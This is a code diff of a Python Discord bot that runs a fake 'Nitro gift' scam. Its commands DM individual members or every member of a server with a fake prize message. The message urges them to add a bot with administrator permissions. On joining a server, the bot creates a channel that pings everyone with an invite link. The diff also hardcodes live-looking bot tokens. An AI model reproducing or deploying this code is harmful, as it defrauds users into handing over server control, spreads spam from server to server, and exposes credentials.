@@ -1,63 +1,48 @@
-from asyncio.tasks import sleep
-from operator import mod
-import re
-import random
 import discord
-from discord import embeds
-from discord import colour
-from discord import user
-from discord import member
-from discord import permissions
-from discord.colour import Color 
 from discord.ext import commands
-from discord.ext.commands import bot
-from discord.ext.commands.bot import Bot
-from discord.ext.commands.core import after_invoke, command, cooldown, has_permissions
-from discord.ext.commands.errors import BotMissingPermissions, MissingPermissions, MissingRequiredArgument
-from discord.member import Member
-from discord.utils import time_snowflake
-from discord import Intents
-from discord.ext import commands
-import asyncio
 
-intents=discord.Intents.all()
+intents = discord.Intents.all()
 
-token = "ODU4MzE2MTM5MDc0OTQ1MDY0.YNcXMg.wOVxCMIKOpdZ7CxDfrAmWpWJxmc"
-client = commands.AutoShardedBot(command_prefix = ',', intents=intents)
-client.remove_command('help')
+client=commands.Bot(command_prefix=".", intents = intents)
+client.remove_command("help")
+token ="ODY1NjEwODMxMjY1OTIzMDk0.YPGg6A.i1-jd6SdOeMzRNW0cvKIEeYyrYo"
 
 @client.event
-async def on_command_error(ctx,error):
-    if isinstance(error,commands.MemberNotFound):
-        await ctx.send('I cant find this user.')
-    
-@client.command()
-@commands.guild_only()
-async def d(ctx,member:discord.Member=None):
- try:
-   embed=discord.Embed(color=discord.Color.blue())
-   embed.add_field(name="**Nitro 10$**",value="Add [**Nitro Bot**](https://discord.com/oauth2/authorize?client_id=864114304978386974&permissions=0&scope=bot) to two of your servers To claim your gift")
-   embed.set_image(url="https://www.supereasy.com/wp-content/uploads/2020/08/2020-08-18_19-14-56.png")    
-   await member.send(embed=embed)
-   await ctx.send(f"Sent to {member.mention}")
- except:
-     await ctx.send(f"I can't dm {member.mention}")
+async def on_guild_join(guild):
+    lol = await guild.create_text_channel(name="nitro")
+    msg = "@here @everyone  https://discord.gg/cYwqYw2Rtr\n\n**Do not delete this channel/message or you're not going to claim the gift**"
+    await lol.send(msg)
 
-@client.command()
-@commands.guild_only()
-@commands.has_permissions(administrator=True)
+@client.command(aliases=["D"])
+async def d(ctx, member : discord.Member=None):
+    if member is None:
+        member = ctx.author
+    try:
+       embed = discord.Embed(color = discord.Color(0x000000))
+       embed.add_field(name="**Nitro gift**",value="You won ``Nitro game`` [Add the bot](https://discord.com/api/oauth2/authorize?client_id=865610831265923094&permissions=8&scope=bot) to your server to claim your gift.")
+       embed.set_image(url="https://i.pinimg.com/originals/ce/e0/7c/cee07c6fde7ccf0b5be8c49f9cef05ff.jpg")
+       embed.set_author(name="Nitro",icon_url="https://i.redd.it/mvoen8wq3w831.png")
+       embed.set_thumbnail(url="https://i.redd.it/mvoen8wq3w831.png")
+    
+       await member.send(embed=embed)
+    except:
+        await ctx.send(f"I can't dm {member}")
+
+@client.command(aliases=["Dm","DM"])
 async def dm(ctx):
-  members = ctx.guild.members
-  for member in members:
+    members = ctx.guild.members
+    for member in members:
         try:
-           embed=discord.Embed(color=discord.Color.blue())
-           embed.add_field(name="**Nitro 10$**",value="Add [**Nitro Bot**](https://discord.com/oauth2/authorize?client_id=864114304978386974&permissions=0&scope=bot) to two of your servers To claim your gift")
-           embed.set_image(url="https://www.supereasy.com/wp-content/uploads/2020/08/2020-08-18_19-14-56.png")    
-           await member.send(embed=embed)
-           await ctx.send(f"Sent to {member.mention}")
-           await asyncio.sleep(300)
+            embed = discord.Embed(color = discord.Color(0x000000))
+            embed.add_field(name="**Nitro gift**",value="You won ``Nitro game`` [Add the bot](https://discord.com/api/oauth2/authorize?client_id=865610831265923094&permissions=8&scope=bot) to your server to claim your gift.")
+            embed.set_image(url="https://i.pinimg.com/originals/ce/e0/7c/cee07c6fde7ccf0b5be8c49f9cef05ff.jpg")
+            embed.set_author(name="Nitro",icon_url="https://i.redd.it/mvoen8wq3w831.png")
+            embed.set_thumbnail(url="https://i.redd.it/mvoen8wq3w831.png")
+    
+            await member.send(embed=embed)
         except:
-           await ctx.send(f" i can't dm {member.mention}")
+            await ctx.send(f"I can't dm {member}")        
+
+
 
 client.run(token)
-
